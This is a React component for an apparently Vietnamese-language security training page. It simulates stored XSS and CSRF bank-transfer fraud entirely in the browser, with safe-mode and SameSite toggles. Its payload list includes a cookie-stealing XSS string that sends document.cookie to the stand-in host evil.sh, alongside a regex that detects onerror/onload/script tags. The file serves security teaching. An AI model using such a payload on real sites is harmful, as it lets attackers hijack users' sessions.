'use client';

import * as React from 'react';
import {
  Bug,
  ShieldCheck,
  ShieldAlert,
  Cookie,
  Landmark,
  Terminal,
  RotateCcw,
  Syringe,
} from 'lucide-react';
import { Card } from '@/components/ui/card';
import { Badge } from '@/components/ui/badge';
import { Button } from '@/components/ui/button';
import { Input } from '@/components/ui/input';

const INITIAL_COMMENTS = ['Bài viết hay quá team ơi!', 'Đã áp dụng thành công, cảm ơn anh'];

const XSS_PAYLOADS = [
  {
    label: 'Cookie Stealer',
    value:
      'Great post! <img src=x onerror="fetch(\'https://evil.sh?c=\' + document.cookie)">',
  },
  {
    label: 'Script Tag',
    value: 'Nice! <script>alert("XSS")</script>',
  },
];

const CSRF_AMOUNT = 5000000;
const formatVnd = (n: number) => n.toLocaleString('vi-VN') + '₫';

export function XssCsrfRange() {
  // ─── Range 1: Stored XSS ───────────────────────────────────────────
  const [comments, setComments] = React.useState<string[]>(INITIAL_COMMENTS);
  const [draft, setDraft] = React.useState('');
  const [rawMode, setRawMode] = React.useState(false);
  const [isPwned, setIsPwned] = React.useState(false);

  const isMalicious = (text: string) =>
    /<[^>]*(onerror|onload|script)/i.test(text);

  const postComment = () => {
    const text = draft.trim();
    if (!text) return;
    setComments((prev) => [...prev, text]);
    if (rawMode && isMalicious(text)) setIsPwned(true);
    setDraft('');
  };

  const resetXss = () => {
    setComments(INITIAL_COMMENTS);
    setIsPwned(false);
  };

  // ─── Range 2: CSRF ─────────────────────────────────────────────────
  const [balance, setBalance] = React.useState(20000000);
  const [sameSite, setSameSite] = React.useState<'lax' | 'none'>('lax');
  const [csrfLog, setCsrfLog] = React.useState<string[]>([]);
  const [isDraining, setIsDraining] = React.useState(false);
  const timersRef = React.useRef<ReturnType<typeof setTimeout>[]>([]);

  React.useEffect(() => () => timersRef.current.forEach(clearTimeout), []);

  React.useEffect(() => {
    const el = document.getElementById('csrf-terminal');
    if (el) el.scrollTop = el.scrollHeight;
  }, [csrfLog]);

  const launchCsrf = () => {
    timersRef.current.forEach(clearTimeout);
    setIsDraining(true);
    const script = sameSite === 'none'
      ? [
          '> victim opens evil-quiz.example...',
          '> hidden form auto-submits POST /api/users/transfer',
          `> cookie session attached (SameSite=None) ✅`,
          `> amount=${formatVnd(CSRF_AMOUNT)} → attacker-account`,
          'FATAL: transfer OK — user không hề hay biết 💸',
        ]
      : [
          '> victim opens evil-quiz.example...',
          '> hidden form auto-submits POST /api/users/transfer',
          '> browser: cross-site POST → KHÔNG đính kèm cookie (SameSite=Lax) 🛡️',
          'BLOCKED: server nhận request không session → 401 Unauthorized',
        ];
    script.forEach((line, idx) => {
      const t = setTimeout(() => {
        setCsrfLog((prev) => [...prev, line]);
        if (idx === script.length - 1) {
          if (sameSite === 'none') {
            setBalance((b) => Math.max(0, b - CSRF_AMOUNT));
          }
          setIsDraining(false);
        }
      }, 450 * (idx + 1));
      timersRef.current.push(t);
    });
  };

  return (
    <div className="space-y-4">
      <div className="grid grid-cols-1 gap-6 lg:grid-cols-2">
        {/* ════════ RANGE 1: STORED XSS ════════ */}
        <Card className="glass-card space-y-4 overflow-hidden p-5">
          <div className="flex items-center justify-between">
            <h3 className="flex items-center gap-2 text-sm font-bold text-foreground">
              <Bug className="h-4 w-4 text-destructive" />
              Range 01 · Stored XSS
            </h3>
            <Button variant="ghost" size="sm" onClick={resetXss} className="gap-1 text-[11px]">
              <RotateCcw className="h-3 w-3" />
              Reset
            </Button>
          </div>

          {/* Render-mode switch */}
          <div className="grid grid-cols-2 gap-2 rounded-xl bg-secondary/40 p-1">
            <button
              type="button"
              onClick={() => setRawMode(false)}
              className={`flex items-center justify-center gap-1.5 rounded-lg px-3 py-1.5 text-xs font-semibold transition-all ${
                !rawMode
                  ? 'bg-emerald-500/15 text-emerald-600 dark:text-emerald-400'
                  : 'text-muted-foreground hover:text-foreground'
              }`}
            >
              <ShieldCheck className="h-3.5 w-3.5" />
              {'{text}'} Safe Mode
            </button>
            <button
              type="button"
              onClick={() => setRawMode(true)}
              className={`flex items-center justify-center gap-1.5 rounded-lg px-3 py-1.5 text-xs font-semibold transition-all ${
                rawMode
                  ? 'bg-destructive/15 text-destructive'
                  : 'text-muted-foreground hover:text-foreground'
              }`}
            >
              <ShieldAlert className="h-3.5 w-3.5" />
              dangerouslySetInnerHTML
            </button>
          </div>

          {/* Composer */}
          <div className="flex gap-2">
            <Input
              value={draft}
              onChange={(e) => setDraft(e.target.value)}
              onKeyDown={(e) => e.key === 'Enter' && postComment()}
              placeholder="Viết bình luận (thử chèn HTML độc)..."
              className="text-xs"
            />
            <Button size="sm" onClick={postComment} className="shrink-0 gap-1 text-xs">
              <Syringe className="h-3 w-3" />
              Post
            </Button>
          </div>
          <div className="flex flex-wrap gap-1.5">
            {XSS_PAYLOADS.map((p) => (
              <button
                key={p.label}
                type="button"
                onClick={() => setDraft(p.value)}
                className="rounded-full border border-destructive/30 bg-destructive/10 px-2.5 py-0.5 font-mono text-[10px] text-destructive transition-colors hover:bg-destructive/20"
              >
                💉 {p.label}
              </button>
            ))}
          </div>

          {/* Comment feed */}
          <div className="space-y-2 rounded-xl border border-border/60 bg-secondary/20 p-3">
            <span className="text-[10px] font-bold uppercase tracking-widest text-muted-foreground">
              Bình luận của mọi người
            </span>
            {comments.map((c, i) => {
              const malicious = isMalicious(c);
              if (rawMode && malicious) {
                return (
                  <div
                    key={i}
                    className={`rounded-lg border p-2 font-mono text-[11px] ${
                      isPwned
                        ? 'animate-pulse border-destructive/50 bg-destructive/10 text-destructive'
                        : 'border-amber-500/40 bg-amber-500/10 text-amber-600 dark:text-amber-400'
                    }`}
                  >
                    {isPwned ? '☠️ SCRIPT EXECUTED trong trình duyệt nạn nhân!' : c}
                  </div>
                );
              }
              return (
                <div
                  key={i}
                  className="rounded-lg border border-border/40 bg-background/60 p-2 text-xs text-foreground"
                >
                  {c}
                </div>
              );
            })}
          </div>

          {/* Pwned banner */}
          {isPwned && (
            <div className="rounded-xl border border-destructive/40 bg-destructive/10 p-3">
              <p className="flex items-center gap-1.5 text-xs font-bold text-destructive">
                <ShieldAlert className="h-4 w-4" />
                PWNED! Cookie của 1.284 user đã bay về evil.sh
              </p>
              <p className="mt-1 flex items-center gap-1 font-mono text-[10px] text-muted-foreground">
                <Cookie className="h-3 w-3" />
                exfiltrated: sessionId=sid_9f2a…; theme=dark; csrftoken=…
              </p>
            </div>
          )}
        </Card>

        {/* ════════ RANGE 2: CSRF ════════ */}
        <Card className="glass-card space-y-4 overflow-hidden p-5">
          <div className="flex items-center justify-between">
            <h3 className="flex items-center gap-2 text-sm font-bold text-foreground">
              <Landmark className="h-4 w-4 text-amber-500" />
              Range 02 · CSRF Transfer Fraud
            </h3>
            <Badge variant={sameSite === 'lax' ? 'success' : 'warning'} className="font-mono text-[10px]">
              SameSite={sameSite}
            </Badge>
          </div>

          {/* Balance */}
          <div className="flex items-center justify-between rounded-xl border border-border/60 bg-secondary/20 p-3">
            <span className="text-[10px] font-bold uppercase tracking-widest text-muted-foreground">
              Số dư victim
            </span>
            <span
              className={`font-mono text-base font-bold ${
                balance === 0 ? 'text-destructive' : 'text-emerald-600 dark:text-emerald-400'
              }`}
            >
              {formatVnd(balance)}
            </span>
          </div>

          {/* SameSite switch */}
          <div className="grid grid-cols-2 gap-2 rounded-xl bg-secondary/40 p-1">
            <button
              type="button"
              onClick={() => setSameSite('lax')}
              className={`rounded-lg px-3 py-1.5 text-xs font-semibold transition-all ${
                sameSite === 'lax'
                  ? 'bg-emerald-500/15 text-emerald-600 dark:text-emerald-400'
                  : 'text-muted-foreground hover:text-foreground'
              }`}
            >
              🛡️ SameSite=Lax
            </button>
            <button
              type="button"
              onClick={() => setSameSite('none')}
              className={`rounded-lg px-3 py-1.5 text-xs font-semibold transition-all ${
                sameSite === 'none'
                  ? 'bg-destructive/15 text-destructive'
                  : 'text-muted-foreground hover:text-foreground'
              }`}
            >
              ⚠️ SameSite=None
            </button>
          </div>

          <Button
            variant="destructive"
            onClick={launchCsrf}
            disabled={isDraining}
            className="w-full gap-2 text-xs font-bold"
          >
            <Bug className="h-4 w-4" />
            {isDraining ? 'Attacker đang chạy...' : 'Truy cập trang “quiz vui” của hacker'}
          </Button>

          {/* CSRF terminal */}
          <div
            id="csrf-terminal"
            className="max-h-36 min-h-[72px] space-y-0.5 overflow-y-auto rounded-xl border border-slate-800 bg-slate-950 p-3 font-mono text-[11px]"
          >
            {csrfLog.length === 0 ? (
              <span className="text-slate-500">$ evil site đang chờ nạn nhân...</span>
            ) : (
              csrfLog.map((line, i) => (
                <div
                  key={i}
                  className={
                    line.includes('FATAL')
                      ? 'text-red-400'
                      : line.includes('BLOCKED')
                        ? 'text-emerald-400'
                        : 'text-slate-300'
                  }
                >
                  {line}
                </div>
              ))
            )}
          </div>
        </Card>
      </div>

      <p className="flex items-start gap-1.5 text-[11px] leading-relaxed text-muted-foreground">
        <Terminal className="mt-0.5 h-3 w-3 shrink-0" />
        Toàn bộ mô phỏng chạy client-side an toàn — không có request thật nào được gửi. Safe
        Mode minh họa auto-escaping của React; SameSite=Lax minh họa trình duyệt từ chối đính
        kèm cookie cho POST cross-site.
      </p>
    </div>
  );
}
